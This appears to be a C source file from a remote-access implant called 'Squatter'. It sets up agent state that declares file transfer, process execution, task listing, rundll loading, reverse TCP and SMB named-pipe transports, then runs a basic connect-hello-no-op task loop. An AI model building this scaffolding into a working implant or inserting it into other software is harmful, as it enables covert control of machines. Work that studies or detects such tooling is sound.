#include "sq_manager.h"

enum sq_status SquatterAgentInitialize(volatile struct squatter_state *state) {
    if (state == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    state->version = SQUATTER_VERSION;
    state->capabilities = SQUATTER_CAP_FILE_GET |
        SQUATTER_CAP_FILE_PUT |
        SQUATTER_CAP_PROCESS_EXEC |
        SQUATTER_CAP_PROCESS_TASKLIST |
        SQUATTER_CAP_LIBRARY_RUNDLL;
    state->transports = SQUATTER_TRANSPORT_REVERSE_TCP |
        SQUATTER_TRANSPORT_SMB_NAMED_PIPE;
    state->ticks = 0;
    state->shutdown = 0;

    return SqStatusSuccess;
}

enum sq_status SquatterAgentTick(volatile struct squatter_state *state) {
    if (state == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    state->ticks++;
    return SqStatusSuccess;
}

enum sq_status SquatterAgentRunBasicPayload(
    volatile struct squatter_state *state,
    struct sq_manager *manager,
    const struct sq_transport_config *transport_config) {
    struct sq_task_request request;
    struct sq_io_packet packet;
    enum sq_status status;

    if (state == SQ_NULL || manager == SQ_NULL || transport_config == SQ_NULL) {
        return SqStatusInvalidParameter;
    }

    status = SqManagerInitialize(manager);
    if (status != SqStatusSuccess) {
        return status;
    }

    status = SqManagerConnectTransport(manager, transport_config);
    if (status != SqStatusSuccess) {
        return status;
    }

    status = SqManagerSendProtocolHello(manager);
    if (status != SqStatusSuccess) {
        return status;
    }

    SqZeroMemory(&request, (sq_u32)sizeof(request));
    request.task_id = SQ_TASK_NOOP;
    status = SqManagerStartTask(manager, &request);
    if (status != SqStatusSuccess) {
        return status;
    }

    for (;;) {
        status = SqManagerDrainOne(manager, &packet);
        if (status == SqStatusQueueEmpty) {
            return SqStatusSuccess;
        }
        if (status != SqStatusSuccess) {
            return status;
        }
        state->ticks++;
    }
}
